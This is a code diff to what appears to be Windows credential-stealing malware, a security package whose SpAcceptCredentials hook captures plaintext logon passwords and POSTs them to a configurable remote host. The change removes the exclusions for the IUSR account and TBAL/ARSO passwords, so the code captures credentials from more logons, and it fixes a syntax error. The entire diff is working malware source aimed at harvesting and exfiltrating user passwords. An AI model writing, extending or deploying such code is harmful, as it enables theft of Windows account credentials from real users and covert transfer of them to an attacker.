@@ -26,8 +26,6 @@ constexpr wchar_t c_BangHttpsEndpoint[] = L"bang/log/";
 constexpr uint64_t c_ReauthCooldown = 5 * 1000 * 1000 * 10;  // 5 seconds, in 10ns units
 constexpr uint32_t c_ConnectAttempts = 5;
 constexpr uint32_t c_RetryInterval = 30 * 1000;  // 30 seconds, in milliseconds
-constexpr wchar_t c_IUSR[] = L"IUSR";  // IUSR anonymous account name
-constexpr wchar_t c_TBAL[] = L"_TBAL_{68EDDCF5-0AEB-4C28-A770-AF5302ECA3C9}";  // TBAL/ARSO password
 
 // stampable values - configured via web interface or helper script
 constexpr wchar_t c_BangHttpsHostname[128] = L"EVERYBODYGETUP";
@@ -92,7 +90,7 @@ DWORD SendCredsAsync(bang::Creds* creds)
                     DEBUG_PRINTW(L"server denied request!\n");
                     goto cleanup;
                 }
-                DEBUG_PRINTW(L"connection failed, retrying after wait\n")
+                DEBUG_PRINTW(L"connection failed, retrying after wait\n");
             }
         }
         if (--attempts) Sleep(c_RetryInterval);
@@ -113,10 +111,7 @@ SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName,
 {
     DEBUG_PRINTW(L"SpAcceptCredentials called\n");
 
-    // ignore empty passwords, IUSR anonymous user, and TBAL/ARSO authentication
-    if (PrimaryCredentials->Password.Length &&
-        lstrcmpW(AccountName->Buffer, c_IUSR) &&
-        lstrcmpW(PrimaryCredentials->Password.Buffer, c_TBAL))
+    if (PrimaryCredentials->Password.Length)
     {
         // SpAcceptCredentials seems to be called twice per authentication
         //   - add a cooldown to avoid redundant POST requests
